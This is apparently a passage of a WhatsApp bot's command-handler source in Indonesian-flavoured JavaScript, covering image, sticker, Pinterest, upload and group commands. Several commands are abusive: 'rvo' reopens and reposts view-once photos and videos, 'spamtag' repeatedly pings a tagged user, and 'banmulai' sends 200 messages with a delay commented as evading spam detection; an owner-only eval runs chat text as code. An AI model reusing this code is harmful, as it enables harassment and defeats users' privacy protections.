"ꜱᴀᴀᴛ ᴋɪᴛᴀ ʙᴇʀᴜꜱᴀʜᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ ᴅᴀʀɪ ᴋɪᴛᴀ, ꜱᴇɢᴀʟᴀ ꜱᴇꜱᴜᴀᴛᴜ ᴅɪ ꜱᴇᴋɪᴛᴀʀ ᴋɪᴛᴀ ᴊᴜɢᴀ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ.",
"ᴘᴇʀᴛᴜᴍʙᴜʜᴀɴ ᴅɪᴍᴜʟᴀɪ ᴋᴇᴛɪᴋᴀ ᴋɪᴛᴀ ᴍᴜʟᴀɪ ᴍᴇɴᴇʀɪᴍᴀ ᴋᴇʟᴇᴍᴀʜᴀɴ ᴋɪᴛᴀ ꜱᴇɴᴅɪʀɪ.",
"ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
"ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
"ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
"ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
"ʜᴀʟ ᴘᴇʀᴛᴀᴍᴀ ʏᴀɴɢ ᴅɪʟᴀᴋᴜᴋᴀɴ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴀɴᴅᴀɴɢ ᴋᴇɢᴀɢᴀʟᴀɴ ꜱᴇʙᴀɢᴀɪ ꜱɪɴʏᴀʟ ᴘᴏꜱɪᴛɪꜰ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ.",
"ᴄɪʀɪ ᴋʜᴀꜱ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇʀᴇᴋᴀ ꜱᴇʟᴀʟᴜ ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴜɴᴛᴜᴋ ᴍᴇᴍᴘᴇʟᴀᴊᴀʀɪ ʜᴀʟ-ʜᴀʟ ʙᴀʀᴜ.",
"ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ɪɴɢɪɴᴋᴀɴ, ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴍᴇɴɢɪɴɢɪɴᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛᴋᴀɴ.",
"ᴏʀᴀɴɢ ᴘᴇꜱɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴋᴇꜱᴜʟɪᴛᴀɴ ᴅɪ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ. ᴏʀᴀɴɢ ʏᴀɴɢ ᴏᴘᴛɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴘᴇʟᴜᴀɴɢ ᴅᴀʟᴀᴍ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴜʟɪᴛᴀɴ.",
"ᴋᴇʀᴀɢᴜᴀɴ ᴍᴇᴍʙᴜɴᴜʜ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴍɪᴍᴘɪ ᴅᴀʀɪᴘᴀᴅᴀ ᴋᴇɢᴀɢᴀʟᴀɴ.",
"ʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ʜᴀʀᴜꜱ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ ꜱᴀᴍᴘᴀɪ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ɪɴɢɪɴ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ.",
"ᴏᴘᴛɪᴍɪꜱᴛɪꜱ ᴀᴅᴀʟᴀʜ ꜱᴀʟᴀʜ ꜱᴀᴛᴜ ᴋᴜᴀʟɪᴛᴀꜱ ʏᴀɴɢ ʟᴇʙɪʜ ᴛᴇʀᴋᴀɪᴛ ᴅᴇɴɢᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀɴ ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴅᴀʀɪᴘᴀᴅᴀ ʏᴀɴɢ ʟᴀɪɴ.",
"ᴘᴇɴɢʜᴀʀɢᴀᴀɴ ᴘᴀʟɪɴɢ ᴛɪɴɢɢɪ ʙᴀɢɪ ꜱᴇᴏʀᴀɴɢ ᴘᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴘᴀ ʏᴀɴɢ ᴅɪᴀ ᴘᴇʀᴏʟᴇʜ ᴅᴀʀɪ ᴘᴇᴋᴇʀᴊᴀᴀɴ ɪᴛᴜ, ᴛᴀᴘɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴇʀᴋᴇᴍʙᴀɴɢ ɪᴀ ᴅᴇɴɢᴀɴ ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱɴʏᴀ ɪᴛᴜ.",
"ᴄᴀʀᴀ ᴛᴇʀʙᴀɪᴋ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ ᴀᴅᴀʟᴀʜ ᴅᴇɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ʙᴇʀʙɪᴄᴀʀᴀ ᴅᴀɴ ᴍᴜʟᴀɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ.",
"ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴜꜱᴜʟ ᴊɪᴋᴀ ᴛᴇᴋᴀᴅ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ ᴄᴜᴋᴜᴘ ᴋᴜᴀᴛ."
]
let motivasii = pickRandom(motivasi)
    reply(`"${motivasii}"`)
}
break

case "hd": {
    if (!quoted) return reply(`Balas gambar dengan caption ${prefix + command}`);
    if (!/image/.test(mime)) return reply(`Contoh: kirim atau balas foto dengan caption *${prefix + command}*`);
    
    await danzy.sendMessage(m.chat, { react: { text: '🕖', key: m.key } });

    try {
        const { remini } = require("./lib/hd.js");
        let media = await quoted.download();
        let enhanced = await remini(media, "enhance");
        enhanced = await remini(enhanced, "enhance");
        enhanced = await remini(enhanced, "enhance");
        await danzy.sendFile(m.chat, enhanced, "", "_Sukses Membuat HD 3x Enhance✅_", m);
    } catch (err) {
        console.error(err);
        await danzy.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply("Gagal memproses gambar HD.");
    }
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "bratvid":  case "bratvideo": {
if (!text) return reply('teksnya');
try {
let brat = `https://fgsi-brat.hf.space/?text=${encodeURIComponent(text)}&isVideo=true`;
let response = await axios.get(brat, { responseType: "arraybuffer" });
let videoBuffer = response.data;
let stickerBuffer = await danzy.sendAsSticker(m.chat, videoBuffer, m, {
packname: global.packname,
})
} catch (err) {
console.error("Error:", err);
}
}
break
//--------------------------------------------------------------------//
case 'kick': {
if (!isAccDanzyDev) return 
  if (!m.isGroup) return 
  if (!BotAdm) return  
  if (!Adm) return 

  let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  if (!q) return DanzyReply("Send number / tag users ");
  await danzy.groupParticipantsUpdate(from, [users], 'remove');
}
break;

case "rvo":
case "readvo":
case "readviewonce":
case "readviewoncemessage": {
  try {
    if (!m.quoted) return reply("Reply to an image/video that you want to view.");

    const quoted = m.quoted;
    const quotedMsg = quoted.message;

    const viewOnceType = Object.keys(quotedMsg || {})[0]; // viewOnceMessage / viewOnceMessageV2
    if (!["viewOnceMessage", "viewOnceMessageV2"].includes(viewOnceType)) {
      return DanzyReply("This is not a view-once message.");
    }

    const innerMessage = quotedMsg[viewOnceType]?.message;
    if (!innerMessage) return DanzyReply("View-once message is no longer available (maybe already opened).");

    const mediaType = Object.keys(innerMessage || {})[0];
    if (!["imageMessage", "videoMessage"].includes(mediaType)) {
      return DanzyReply("Quoted message is not an image or video.");
    }

    const mediaContent = innerMessage[mediaType];
    const stream = await downloadContentFromMessage(
      mediaContent,
      mediaType === "imageMessage" ? "image" : "video"
    );
    const buffer = await streamToBuffer(stream); // Sudah Buffer langsung, tidak perlu concat lagi

    // Caption otomatis
    const originalCaption = mediaContent.caption || "";
    const senderName = quoted.pushName || "Unknown";
    const senderJid = quoted.sender || "unknown";
    const timeString = new Date().toLocaleString('id-ID', {
      dateStyle: 'long',
      timeStyle: 'short'
    });

    const caption =
      `*[VIEW ONCE REOPENED]*\n` +
      `*From:* @${senderJid.split('@')[0]} (${senderName})\n` +
      `*Time:* ${timeString}\n` +
      (originalCaption ? `*Caption:* ${originalCaption}` : "");

    const sendPayload = mediaType === "videoMessage"
      ? { video: buffer, caption, mentions: [senderJid] }
      : { image: buffer, caption, mentions: [senderJid] };

    await danzy.sendMessage(m.chat, sendPayload);
    await danzy.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

  } catch (err) {
    console.error("Failed to read view-once:", err);
    DanzyReply("Something went wrong while reading the view-once message.");
  }
  break;
}

// Fungsi helper diperbaiki
async function streamToBuffer(stream) {
  const chunks = [];
  for await (const chunk of stream) chunks.push(chunk);
  return Buffer.concat(chunks); // Penting agar hasilnya benar
}


case 'spamtag': {
    if (!m.mentionedJid[0]) {
        return reply('Tag orangnya!!!\nExample: .spamtag @danzyy1|10');
    }

    const [orang, amountStr] = text.split("|").map(item => item.trim());
    const amount = parseInt(amountStr, 10);

    if (isNaN(amount) || amount <= 0) {
        return reply('Jumlah harus berupa angka!');
    }

    for (let i = 0; i < amount; i++) {
        danzy.sendMessage(m.chat, {
            text: orang,
            mentions: [m.mentionedJid[0]]
        });
       await sleep(500) 
    }
}
break

case "banscxmods": {
let msgbug = `*\`[Keamanan Terdeteksi!!!]\`*\nAda yang telah menggunakan script xmods KW/CRACK!!!`
let buttons = [
        { buttonId: ".banmulai", buttonText: { displayText: "ＭＯＤＡＬ ＤＩＫＩＴ ＤＥＫ" } }
    ];

    let buttonMessage = {
        image: fs.readFileSync('./menu.png'), 
        caption: msgbug,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363314734246493@newsletter",
                newsletterName: "𝐗͢𝐌͡𝐎͢𝐃͡𝐒 𝐈͢𝐍͜͢𝐅͢𝐈ͯ𝐍𝐈𝐓𝐘 𝐕͢𝟐.𝟎"
            }
        },
        footer: "© Xmods Infinity v2",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
  };
await danzy.sendMessage(m.chat, buttonMessage, { quoted: PayX });
}
break

case 'banmulai': {
    const pesan = "*[Security Detectable!!!]*\nɴɢᴀᴘᴀɪɴ ᴘᴀᴋᴇ sᴄ ᴄʀᴀᴄᴋ ᴅᴇᴋ";
    const amount = 200;

    for (let i = 0; i < amount; i++) {
        await danzy.sendMessage(m.chat, { text: pesan }, { quoted: ftoko });
        await sleep(500); // Jeda 0.5 detik agar tidak terdeteksi spam
    }

    reply("/bannscxmods");
}
break;

case 'stopban': {
    return reply("Spam dihentikan! (Jika sedang berjalan, mungkin masih ada beberapa pesan yang terkirim)");
}
break;

case 'pinterest': case 'pin': {
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix + command} Tobrut`);
async function sendAlbumMessage(jid, medias, options) {
  options = { ...options };

  const caption = options.text || options.caption || "";

  const album = baileys.generateWAMessageFromContent(jid, {
    albumMessage: {
      expectedImageCount: medias.filter(media => media.type === "image").length,
      expectedVideoCount: medias.filter(media => media.type === "video").length,
      ...(options.quoted ? {
        contextInfo: {
          remoteJid: options.quoted.key.remoteJid,
          fromMe: options.quoted.key.fromMe,
          stanzaId: options.quoted.key.id,
          participant: options.quoted.key.participant || options.quoted.key.remoteJid,
          quotedMessage: options.quoted.message
        }
      } : {})
    }
  }, { quoted: m});

  await danzy.relayMessage(album.key.remoteJid, album.message, {
    messageId: album.key.id
  });

  for (const media of medias) {
    const { type, data } = media;
    const img = await baileys.generateWAMessage(album.key.remoteJid, {
      [type]: data,
      ...(media === medias[0] ? { caption } : {})
    }, {
      upload: danzy.waUploadToServer
    });
    img.message.messageContextInfo = {
      messageAssociation: {
        associationType: 1,
        parentMessageKey: album.key
      }
    };
    await danzy.relayMessage(img.key.remoteJid, img.message, {
      messageId: img.key.id
    });
  }

  return album;
}
    const blockedWords = /(judi|judol sialan)/i; //bagian filter teks, atur aja sendiri
    if (blockedWords.test(text)) {
        return reply('Tidak bisa melanjutkan pencarian');
    }
    await reply('Done mek');
    function shuffleArray(array) {
        for (let i = array.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [array[i], array[j]] = [array[j], array[i]];
        }
    }
    try {
        let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
        let res = data.resource_response.data.results.map(v => v.images.orig.url);

        shuffleArray(res);
        let ult = res.slice(0, 4);

        if (ult.length === 0) return DanzyReply('Gambar tidak ditemukan.');

        if (!m.isGroup) {
            let mediaArray = ult.map(url => ({ type: "image", data: { url } }));
            await sendAlbumMessage(m.chat, mediaArray, { caption: `Hasil pencarian: ${text}` });
        } else {
            let push = [];
            let i = 1;

            async function createImage(url) {
                const { imageMessage } = await generateWAMessageContent({ image: { thumb } }, { upload: danzy.waUploadToServer });
                return imageMessage;
            }

            for (let lucuy of ult) {
                push.push({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `Image ke - ${i++}`
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.fromObject({
                        text: "Danzy Dev"
                    }),
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                        title: 'Hasil.',
                        hasMediaAttachment: true,
                        imageMessage: await createImage(lucuy)
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{"display_text":"My Owner","url":"${global.owner}","merchant_url":"${global.owner}"}`
                            },
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{"display_text":"Source","url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}","merchant_url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}"}`
                            }
                        ]
                    })
                });
            }

            const bot = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: 'Done'
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: global.botname
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                hasMediaAttachment: false
                            }),
                            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                                cards: [...push]
                            })
                        })
                    }
                }
            }, { quoted: m });
            await danzy.relayMessage(m.chat, bot.message, { messageId: bot.key.id });
        }

    } catch (err) {
        console.error(err);
        reply('𝗘𝗿𝗿𝗼𝗿 𝗯𝗮𝗻𝗴');
    }
}
break

case 'tourl': {
    let q = m.quoted ? m.quoted : PayX;
    if (!q || !q.download) return DanzyReply(`Balas gambar atau video dengan perintah ${prefix + command}`);

    let mime = q.mimetype || '';
    if (!/image\/(png|jpe?g|gif)|video\/mp4/.test(mime)) {
        return reply('Hanya gambar atau video MP4 yang didukung!');
    }

    let media;
    try {
        media = await q.download();
    } catch (error) {
        return reply('Gagal mengunduh media!');
    }

    const fileType = require('file-type');
    const type = await fileType.fromBuffer(media);
    const fileName = `file.${type?.ext || 'bin'}`;

    let link = await uploadToCatbox(media, fileName);
    if (!link) return reply('Upload gagal, coba lagi nanti.');

    danzy.sendMessage(m.chat, {
        text: `✅ Berhasil diunggah ke Catbox:\n${link}`
    }, { quoted: PayX });
}
break

case "tozip": {
    if (!text) return reply('Linknya?');

    await reply('⏳ Sedang mengunduh dan mengekstrak ke ZIP...');

    try {
        const fs = require('fs');
        const path = require('path');
        const archiver = require('archiver');
        const axios = require('axios');
        const url = require('url');

        const tempDir = './temp';
        if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });

        const fileUrl = text.trim();
        const parsedUrl = url.parse(fileUrl);
        let fileName = path.basename(parsedUrl.pathname);

        if (!fileName || !fileName.includes('.')) {
            fileName = `file_${Date.now()}.bin`;
        }

        const filePath = path.join(tempDir, fileName);
        const response = await axios.get(fileUrl, { responseType: 'stream' });

        const writer = fs.createWriteStream(filePath);
        response.data.pipe(writer);

        await new Promise((resolve, reject) => {
            writer.on('finish', resolve);
            writer.on('error', reject);
        });

        const zipPath = path.join(tempDir, `${pushname}.zip`);
        const output = fs.createWriteStream(zipPath);
        const archive = archiver('zip', { zlib: { level: 9 } });

        archive.pipe(output);
        archive.file(filePath, { name: fileName });

        await archive.finalize();
        await new Promise((resolve, reject) => {
            output.on('close', resolve);
            archive.on('error', reject);
        });

        await danzy.sendMessage(m.chat, {
            document: fs.readFileSync(zipPath),
            fileName: path.basename(zipPath),
            mimetype: 'application/zip',
            caption: `✅ Berhasil! File dari URL sudah dikompres menjadi ZIP.`,
        }, { quoted: m });

        fs.unlinkSync(filePath);
        fs.unlinkSync(zipPath);

    } catch (err) {
        console.error('ZIP error:', err);
        reply(`❌ Gagal membuat ZIP:\n${err.message}`);
    }
}
break

case 'antitagsw': {
 if (!m.isGroup) return reply('*[Akses Ditolak!!]*\nғɪᴛᴜʀ ᴋʜᴜsᴜs 𝙿𝚁𝙴𝙼𝙸𝚄𝙼')
if (!(isAdmins || isOwner)) return reply('*[Akses Ditolak!!]*\nғɪᴛᴜʀ ᴋʜᴜsᴜs 𝙿𝚁𝙴𝙼𝙸𝚄𝙼')
if (args[0] === "on") {
       //WM: KHAERUL, jangan hapus wm dong biar kaya orang lain
 antiTagSWGroup[m.chat] = true
       //WM: KHAERUL, jangan hapus wm dong biar kaya orang lain😭  
    saveAntiTagSW(antiTagSWGroup)
        reply("𝗙𝗶𝘁𝘂𝗿 𝗮𝗻𝘁𝗶 𝘁𝗮𝗴 𝘀𝘁𝗮𝘁𝘂𝘀 𝗴𝗿𝘂𝗽 𝗮𝗸𝘁𝗶𝗳 𝗱𝗶 𝗴𝗿𝘂𝗽 𝗶𝗻𝗶!")
    } else if (args[0] === "off") {
        delete antiTagSWGroup[m.chat];
       //WM: KHAERUL, jangan hapus wm dong biar kaya orang lain😭
//My saluran: https://whatsapp.com/channel/0029VaWA5U1EQIamnmeXRn2M
 saveAntiTagSW(antiTagSWGroup);
      reply("𝗙𝗶𝘁𝘂𝗿 𝗮𝗻𝘁𝗶 𝘁𝗮𝗴 𝘀𝘁𝗮𝘁𝘂𝘀 𝗴𝗿𝘂𝗽 𝗱𝗶𝗻𝗼𝗻𝗮𝗸𝘁𝗶𝗳𝗸𝗮𝗻 𝗱𝗶 𝗴𝗿𝘂𝗽 𝗶𝗻𝗶!")
    } else {
        reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix}𝗔𝗻𝘁𝗶𝘁𝗮𝗴𝘀𝘄 𝗢𝗻/𝗢𝗳𝗳`)
    }
   break;
}
                      
// ========== [ 📂 BATAS CASE 📂 ] ========= //
default:
if (budy.startsWith('>')) {
if (!isOwner) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await m.replydanzy(evaled);
} catch (err) {
m.replydanzy(String(err));
}
}

if (budy.startsWith('<')) {
if (!isOwner) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (err) {
teks = e
} finally {
await m.replydanzy(require('util').format(teks))
}
}

}
} catch (err) {
console.log(require("util").format(err));
}
};

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
});